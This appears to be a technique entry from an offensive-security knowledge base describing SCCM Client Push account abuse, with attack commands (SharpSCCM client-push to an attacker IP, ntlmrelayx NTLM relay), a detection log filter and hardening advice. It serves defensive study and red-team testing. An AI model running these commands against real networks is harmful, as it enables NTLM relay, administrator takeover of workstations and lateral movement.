# [PE-VALID-008]: SCCM Client Push Account Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-008 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Local Accounts (T1078.003)](https://attack.mitre.org/techniques/T1078/003/) |
| **Tactic** | Credential Access / Privilege Escalation |
| **Platforms** | Windows AD / SCCM |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** SCCM (MECM) uses a "Client Push Installation Account" to automatically install agents on new computers. This account *must* be a Local Administrator on every target machine. If "Automatic Site-Wide Client Push" is enabled, an attacker can trigger a push to a machine they control (e.g., by creating a fake computer object or using `SharpSCCM`). The SCCM server then connects to the attacker's machine via SMB (NTLM authentication). Since NTLM is used, the attacker can relay this authentication to other systems or crack the hash.
- **Attack Surface:** SCCM Management Point.
- **Business Impact:** **Lateral Movement**. Compromising any workstation in the site.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Ability to create Computer objects or trigger SCCM discovery.
- **Tools:**
    - [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
    - [Responder](https://github.com/lgandx/Responder)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Trigger Push**
Tell SCCM to install the client on your attacker IP.
```bash
SharpSCCM.exe invoke client-push -t 192.168.1.50
```

**Step 2: Capture/Relay**
Run Responder or ntlmrelayx on 192.168.1.50.
```bash
ntlmrelayx.py -t smb://target-workstation -smb2support
```
*The SCCM Push Account connects, gets relayed, and grants Admin access on `target-workstation`.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 SCCM Logs
| Source | Event | Filter Logic |
|---|---|---|
| **ccm.log** | `Client Push` | Failed push attempts to unknown/rogue IPs. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Disable NTLM Fallback:** In SCCM Client Push settings, disable "Allow connection fallback to NTLM". This forces Kerberos, which cannot be relayed (easily).
*   **Least Privilege:** Use a dedicated account for Client Push that is *only* admin on workstations, never servers.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-VALID-002]
> **Next Logical Step:** [LAT-CLASSIC-002]
